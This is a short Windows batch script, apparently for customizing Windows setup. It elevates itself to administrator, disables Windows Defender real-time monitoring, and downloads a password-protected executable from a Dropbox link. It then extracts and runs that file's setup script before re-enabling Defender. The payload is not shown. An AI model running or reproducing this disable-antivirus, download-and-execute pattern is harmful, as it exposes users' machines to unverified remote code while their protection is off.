@NET SESSION > NUL 2> NUL || PowerShell -Command "Start-Process \"%0\" -Verb RunAs" && EXIT
@ECHO OFF
CD /D "%~dp0\..\Extra\"

PowerShell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

PowerShell -Command "(new-object System.Net.WebClient).DownloadFile('https://www.dropbox.com/s/1i3917ukr2pxgk2/_oem_.exe?dl=1','_oem_.exe')"

_oem_.exe -P"_oem_" -Y

CALL $oem$\$$\Setup\Scripts\SetupComplete.cmd
RD /S /Q $oem$

PowerShell -Command "Set-MpPreference -DisableRealtimeMonitoring $false"

PAUSE
